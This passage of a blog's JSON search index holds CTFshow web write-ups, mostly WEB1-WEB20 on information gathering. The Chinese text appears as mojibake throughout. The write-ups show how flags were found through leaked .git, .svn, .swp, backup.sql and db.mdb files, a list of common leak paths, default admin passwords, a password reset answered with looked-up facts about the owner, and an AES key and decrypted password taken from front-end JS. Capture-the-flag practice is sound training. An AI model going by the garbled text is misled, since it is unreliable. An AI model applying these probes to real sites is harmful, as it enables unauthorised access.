´ï¼Œçœ‹æç¤ºåç›´æ¥ç”¨/1-100/1-100æ‰«æå°±å¯ä»¥äº†ï¼Œä¸éœ€è¦ç”¨åˆ«çš„å¤æ‚æ–¹æ³•ã€‚\n","date":"2024-11-07T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/ctfshow_web_explosion_write_up/","title":"CTF_show Web çˆ†ç ´writeup WEB21-WEB28"},{"content":"CTFSHOW webå…¥é—¨ ä¿¡æ¯æ”¶é›†WriteUP 2 3 3 C T F S H O W\nå› ä¸ºæ”¾å›¾åå›½å†…ç½‘ç»œé—®é¢˜å¯¼è‡´åŠ è½½é€Ÿåº¦å¾ˆæ…¢æ•ˆæœä¸ä½³æ‰€ä»¥ä»è¿™ä¸ªå¼€å§‹å°±å°½é‡ä¸æ”¾å›¾ç‰‡äº†\nWEB1 å¼€å‘æ³¨é‡ŠæœªåŠæ—¶åˆ é™¤\nè¿›å…¥ç¯å¢ƒç›´æ¥ä½¿ç”¨F12æ‰“å¼€æ§åˆ¶å°å³å¯æ‰¾å‡ºflag\n\u0026lt;!-- ctfshow{4fd63d59-4831-49ff-9bd6-4ee34b8e70c4} --\u0026gt;\nWEB2 jså‰å°æ‹¦æˆª === æ— æ•ˆæ“ä½œ\nè¿™é“é¢˜è¿›å»ä»¥åå‘ç°F12æŒ‰äº†æ²¡ååº”ï¼Œå³é”®ä¹Ÿä¸è¡Œï¼Œä½†æ˜¯å¯ä»¥ç›´æ¥é€šè¿‡æµè§ˆå™¨ç•Œé¢æ‰“å¼€å¼€å‘è€…æ¨¡å¼æˆ–è€…é€šè¿‡æŸ¥çœ‹æºä»£ç ç»•è¿‡ï¼Œflagå°±åœ¨æ³¨é‡Šé‡Œ\n\u0026lt;!-- ctfshow{5f025258-4778-4833-95ff-1941f3ae0f6e} --\u0026gt;\nWEB3 æ²¡æ€è·¯çš„æ—¶å€™æŠ“ä¸ªåŒ…çœ‹çœ‹ï¼Œå¯èƒ½ä¼šæœ‰æ„å¤–æ”¶è·\næ ¹æ®æç¤ºä»è¯·æ±‚å¤´ç›´æ¥æŠ“å–åˆ°flag\nFlag: ctfshow{c9e9eea4-5293-47d2-8f13-219856f7d61e}\nWEB4 æ€»æœ‰äººæŠŠåå°åœ°å€å†™å…¥robotsï¼Œå¸®é»‘é˜”å¤§ä½¬ä»¬å¼•è·¯ã€‚\nè¿™é“é¢˜æ ¹æ®æç¤ºç›´æ¥è®¿é—®robots.txtï¼Œè·å–åˆ°flagæ–‡ä»¶åœ°å€ï¼Œè®¿é—®å³å¯å¾—åˆ°flag\nWEB5 phpsæºç æ³„éœ²æœ‰æ—¶å€™èƒ½å¸®ä¸Šå¿™\nè¿™é“é¢˜ä¸€å¼€å§‹æ²¡æœ‰æ€è·¯ï¼Œä½†æ˜¯çœ‹åˆ°phpsæ–‡ä»¶å°è¯•è®¿é—®index.phpsä¸‹è½½åˆ°ä¸»é¡µçš„æºç åç›´æ¥åœ¨æ³¨é‡Šé‡Œå¾—åˆ°flag\n//ctfshow{2b127e88-8378-410e-abe0-1f215357d8ac}\nWEB6 è§£å‹æºç åˆ°å½“å‰ç›®å½•ï¼Œæµ‹è¯•æ­£å¸¸ï¼Œæ”¶å·¥\nè¿™é“é¢˜æ˜¯ç«™é•¿å¤ªç²—å¿ƒç›´æ¥æŠŠç½‘ç«™æºç é—ç•™åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œæ‰«æç›®å½•å‘ç°www.zipï¼Œä¸‹è½½å³å¯ç›´æ¥è·å¾—flag\nWEB7 ç‰ˆæœ¬æ§åˆ¶å¾ˆé‡è¦ï¼Œä½†ä¸è¦éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ›´é‡è¦ã€‚\nè¿™é“é¢˜æ ¹æ®æç¤ºå¯ä»¥çŒœåˆ°æ˜¯ç‰ˆæœ¬æ–‡ä»¶æ³„éœ²ï¼Œå°è¯•è®¿é—®/.gitç›´æ¥è·å–flag\nWEB8 ç‰ˆæœ¬æ§åˆ¶å¾ˆé‡è¦ï¼Œä½†ä¸è¦éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ›´é‡è¦ã€‚\nå—¯ï¼Ÿéš¾é“æˆ‘çœ‹é”™é¢˜äº†ï¼Ÿä¸è¿‡æµ‹è¯•å‘ç°.gitè¿™æ¬¡ä¸è¡Œäº†ï¼Œç»è¿‡æœç´¢å‘ç°.svnä¹Ÿæ˜¯å¸¸ç”¨çš„å¼€å‘ç‰ˆæœ¬æ–‡ä»¶ï¼Œå°è¯•è®¿é—®å‘ç°ç›´æ¥è·å–flag\n1 2 3 NOTE å¸¸è§æ–‡ä»¶æ³„éœ²ç›®å½•æ ¼å¼ .git .svn .DS_store .hg /CVS/* .bzr .filename.swp phpinfo.php WEB9 å‘ç°ç½‘é¡µæœ‰ä¸ªé”™åˆ«å­—ï¼Ÿèµ¶ç´§åœ¨ç”Ÿäº§ç¯å¢ƒvimæ”¹ä¸‹ï¼Œä¸å¥½ï¼Œæ­»æœºäº†\nè¿™é¢˜ä¼¼ä¹ä¹Ÿæ²¡å•¥æ€è·¯ï¼Œä¸è¿‡ä¸Šä¸€é¢˜æŸ¥è¿‡vimçš„ç¼“å­˜æ–‡ä»¶ .filename.swp å°è¯•è®¿é—®index.php.swpç›´æ¥è·å–åˆ°äº†flag\nWEB10 cookie åªæ˜¯ä¸€å—é¥¼å¹²ï¼Œä¸èƒ½å­˜æ”¾ä»»ä½•éšç§æ•°æ®\næ ¹æ®æç¤ºç›´æ¥æŠ“åŒ…è·å–cookieå†…å­˜å‚¨çš„çš„flag\nWEB11 åŸŸåå…¶å®ä¹Ÿå¯ä»¥éšè—ä¿¡æ¯ï¼Œæ¯”å¦‚flag.ctfshow.com å°±éšè—äº†ä¸€æ¡ä¿¡æ¯\nç”¨å¥½å‡ ä¸ªç½‘ç«™æŸ¥è¯¢éƒ½ä¸è¡Œï¼Œä¸çŸ¥é“æ˜¯ä»€ä¹ˆé—®é¢˜ï¼Œå¯èƒ½åŸŸåæœ‰é—®é¢˜ï¼Œè®¿é—®ä¸äº†äº†ï¼Œä¸è¿‡å¤§æ¦‚æ˜¯è€ƒnslookupè¿™ç§åŸŸåè§£æçš„çŸ¥è¯†\nWEB12 æœ‰æ—¶å€™ç½‘ç«™ä¸Šçš„å…¬å¼€ä¿¡æ¯ï¼Œå°±æ˜¯ç®¡ç†å‘˜å¸¸ç”¨å¯†ç \nç½‘ç«™åº•ä¸‹çš„å¸®åŠ©çƒ­çº¿å°±æ˜¯å¯†ç ï¼Œç›´æ¥ä½¿ç”¨adminè´¦å·å³å¯ç™»å½•\nWEB13 æŠ€æœ¯æ–‡æ¡£é‡Œé¢ä¸è¦å‡ºç°æ•æ„Ÿä¿¡æ¯ï¼Œéƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒååŠæ—¶ä¿®æ”¹é»˜è®¤å¯†ç \nåœ¨ç½‘ç«™é¡¶éƒ¨çœ‹åˆ°documentï¼Œç‚¹è¿›å»åçœ‹åˆ°é»˜è®¤å¯†ç ï¼Œå°è¯•ç™»å½•ç›´æ¥æˆåŠŸ\nWEB14 æœ‰æ—¶å€™æºç é‡Œé¢å°±èƒ½ä¸ç»æ„é—´æ³„éœ²é‡è¦(editor)çš„ä¿¡æ¯,é»˜è®¤é…ç½®å®³æ­»äºº\nè¿™é“é¢˜ä¸€å¼€å§‹ä¹Ÿæ²¡æ€è·¯ï¼Œç‚¹æç¤ºåæ‰å‘ç°/editoræ˜¯ä¸ªèƒ½è®¿é—®çš„æ’å…¥ç¼–è¾‘å™¨ï¼Œé€‰æ‹©ä¸Šä¼ æ–‡ä»¶å‘ç°æœ‰ä¸ªæ–‡ä»¶æµè§ˆï¼Œä¸€çœ‹ç›´æ¥è¿ä¼ é©¬éƒ½ä¸éœ€è¦äº†ï¼Œç›´æ¥æ‰¾åˆ°flagæ‰€åœ¨æ–‡ä»¶æ‰“å¼€å³å¯\nWEB15 å…¬å¼€çš„ä¿¡æ¯æ¯”å¦‚é‚®ç®±ï¼Œå¯èƒ½é€ æˆä¿¡æ¯æ³„éœ²ï¼Œäº§ç”Ÿä¸¥é‡åæœ\næ ¹æ®æç¤ºæ‰¾åˆ°ä¸€ä¸ªQQé‚®ç®±ï¼Œå°è¯•/adminå‘ç°åå°ç®¡ç†ç•Œé¢ï¼Œå°è¯•é‚®ç®±å¤±è´¥ï¼Œä¸è¿‡å‘ç°æœ‰é‡ç½®å¯†ç ç•Œé¢ï¼Œç‚¹è¿›å»å‘ç°æ˜¯æˆ‘æ‰€åœ¨çš„åŸå¸‚ï¼Ÿæ ¹æ®QQé‚®ç®±çš„QQç›´æ¥æœåˆ°è¿™ä¸ªäººæ˜¯åœ¨è¥¿å®‰ï¼Œå°è¯•åç›´æ¥æ”¹æ‰äº†å¯†ç è¿›å…¥åå°\nWEB16 å¯¹äºæµ‹è¯•ç”¨çš„æ¢é’ˆï¼Œä½¿ç”¨å®Œæ¯•åè¦åŠæ—¶åˆ é™¤ï¼Œå¯èƒ½ä¼šé€ æˆä¿¡æ¯æ³„éœ²\nç›´æ¥è®¿é—®tz.phpæ‰¾phpinfoä¿¡æ¯ï¼Œç„¶åç›´æ¥æœç´¢åˆ°ä½œä¸ºflagçš„ç¯å¢ƒå˜é‡\nWEB17 å¤‡ä»½çš„sqlæ–‡ä»¶ä¼šæ³„éœ²æ•æ„Ÿä¿¡æ¯\nç›´æ¥ä¸‹è½½backup.sqlè·å¾—flag\nWEB18 ä¸è¦ç€æ€¥ï¼Œä¼‘æ¯ï¼Œä¼‘æ¯ä¸€ä¼šå„¿ï¼Œç©101åˆ†ç»™ä½ flag\nè¿™é“é¢˜æ˜¯ä¸ªå¾ˆéš¾çš„Flappy birdï¼Œç©äº†ä¸€ä¼šå‘ç°æ ¹æœ¬ä¸å¯èƒ½è¿‡ï¼Œæ‰€ä»¥F12æ‰¾åˆ°jsæ–‡ä»¶çš„é€šè¿‡æ¡ä»¶çš„js\n1 var result=window.confirm(\u0026#34;\\u4f60\\u8d62\\u4e86\\uff0c\\u53bb\\u5e7a\\u5e7a\\u96f6\\u70b9\\u76ae\\u7231\\u5403\\u76ae\\u770b\\u770b\u0026#34;); ç›´æ¥å¤åˆ¶åˆ°æ§åˆ¶å°ï¼Œå¼¹å‡ºæç¤ºï¼šä½ èµ¢äº†ï¼Œå»å¹ºå¹ºé›¶ç‚¹çš®çˆ±åƒçš®çœ‹çœ‹\næ ¹æ®è°éŸ³è®¿é—®110.phpç›´æ¥è·å–flag\nWEB19 å¯†é’¥ä»€ä¹ˆçš„ï¼Œå°±ä¸è¦æ”¾åœ¨å‰ç«¯äº†\nè¿™é“é¢˜å¯†é’¥å‰ç«¯éªŒè¯ï¼Œå¯ä»¥ç›´æ¥ä»å‰ç«¯æ‰¾åˆ°åˆ¤æ–­çš„jsä»£ç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 function checkForm(){ var key = \u0026#34;0000000372619038\u0026#34;; var iv = \u0026#34;ilove36dverymuch\u0026#34;; var pazzword = $(\u0026#34;#pazzword\u0026#34;).val(); pazzword = encrypt(pazzword,key,iv); $(\u0026#34;#pazzword\u0026#34;).val(pazzword); $(\u0026#34;#loginForm\u0026#34;).submit(); } function encrypt(data,key,iv) { //key,ivï¼š16ä½çš„å­—ç¬¦ä¸² var key1 = CryptoJS.enc.Latin1.parse(key); var iv1 = CryptoJS.enc.Latin1.parse(iv); return CryptoJS.AES.encrypt(data, key1,{ iv : iv1, mode : CryptoJS.mode.CBC, padding : CryptoJS.pad.ZeroPadding }).toString(); } è¿˜ç»™äº†éªŒè¯çš„å¯†é’¥\n1 2 3 4 5 6 7 8 9 10 error_reporting(0); $flag=\u0026#34;fakeflag\u0026#34; $u = $_POST[\u0026#39;username\u0026#39;]; $p = $_POST[\u0026#39;pazzword\u0026#39;]; if(isset($u) \u0026amp;\u0026amp; isset($p)){ if($u===\u0026#39;admin\u0026#39; \u0026amp;\u0026amp; $p ===\u0026#39;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04\u0026#39;){ echo $flag; } } æ ¹æ®æ”¶é›†åˆ°çš„ä¿¡æ¯æœç´¢AESåŠ å¯†ï¼Œä½¿ç”¨è¿™ä¸ªç½‘ç«™ï¼Œä»ä¸Šé¢å‰ç«¯çš„JSä¸­æ‰¾åˆ°ç›¸å…³æ–¹æ³•ï¼šCBC ZeroPaddingï¼Œå†æ ¹æ®å¯†æ–‡è§£å¯†å‡ºå¯†ç ï¼ši_want_a_36d_girl\nç›´æ¥æäº¤è´¦å·å’Œå¯†ç admin i_want_a_36d_girlè·å–flag\nWEB20 mdbæ–‡ä»¶æ˜¯æ—©æœŸasp+accessæ„æ¶çš„æ•°æ®åº“æ–‡ä»¶ï¼Œæ–‡ä»¶æ³„éœ²ç›¸å½“äºæ•°æ®åº“è¢«è„±è£¤äº†ã€‚\næ ¹æ®æç¤ºæœç´¢ç›¸å…³ä¿¡æ¯ï¼Œå¯ä»¥æœåˆ°/db/db.mdbï¼Œå°è¯•ä¸‹è½½åä½¿ç”¨accessæ‰“å¼€ï¼Œè™½ç„¶æŠ¥äº†ä¸€å †é”™ï¼Œä½†æ˜¯æœ€åè¿˜æ˜¯æ‰¾åˆ°äº†flag\nflag{ctfshow_old_database}\n","date":"2024-11-06T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/ctfshow_web_informationcollect_write_up/","title":"CTF_show Webå…¥é—¨ ä¿¡æ¯æ”¶é›†writeup WEB1-WEB20"},{"content":"æ–°äººç¬¬ä¸€æ¬¡æ¯”èµ›çš„writeupï¼Œå¯èƒ½å†™çš„æœ‰å¾ˆå•°å—¦çš„åœ°æ–¹ï¼Œè¯·é«˜æ‰‹ä»¬è§è°…å‘€QAQ\nå› ä¸ºç›´æ¥ä¸Šä¼ å¤ªå¤§äº†ï¼Œè®¿é—®æ•ˆæœä¸ä½³ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥æä¾›åŸå§‹æ–‡æ¡£\nBuildCTFå®˜æ–¹å›¾ç‰‡ ç‚¹å‡»æ­¤å¤„æŸ¥çœ‹\n","date":"2024-10-31T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/build_ctf_write_up/","title":"ä»BuildCTFå¼€å§‹â€”â€”CTFçš„æ—…ç¨‹"},{"content":" éšç€å‰ä¸¤ä¸ªåšå®¢åˆ†åˆ«å› ä¸º æ²¡ç»­è´¹å’Œrm -rf ç›¸ç»§æš´æ¯™ä»¥åï¼Œç¬¬ä¸‰ä¸ªåˆåŒå’å•æ¥å•¦ï¼ï¼\nå—¯ æœ‰ç‚¹ä¸å‰åˆ©\n","date":"2024-10-31T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/new_start_first_blog/","title":"ç¬¬ä¸€ç¯‡åšå®¢"},{"content":"","date":"0001-01-01T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/","title":""}]